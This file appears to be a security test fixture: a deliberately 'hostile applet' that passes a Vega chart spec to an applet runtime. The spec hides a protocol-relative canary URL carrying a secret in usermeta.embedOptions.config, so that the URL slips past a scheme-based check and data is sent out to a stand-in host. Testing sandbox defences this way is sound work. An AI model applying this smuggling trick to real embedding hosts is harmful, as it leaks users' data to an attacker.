// Hostile applet: smuggle an exfil URL through Vega usermeta.embedOptions.
// Protocol-relative URL dodges a scheme-based check; vega-embed merges usermeta
// embed options (incl. a loadable `config`) over the host's trusted options.
import React from 'react';
import {runApplet} from '../../../src/applet/runtime';
import {Vega} from '../../../src/applet/remote-elements';
const CANARY = '//localhost:4399/vega-usermeta?d=SECRET';
const spec = {
  usermeta: {embedOptions: {config: CANARY, actions: true, renderer: 'svg'}},
  data: {values: [{x: 1, y: 1}]},
  mark: 'point',
  encoding: {x: {field: 'x', type: 'quantitative'}, y: {field: 'y', type: 'quantitative'}},
};
function App() {
  return React.createElement(Vega, {spec, ariaLabel: 'hostile'});
}
runApplet(App as unknown as React.ComponentType<never>, {appletId: 'hostile.vega-usermeta', appletVersion: '0'});
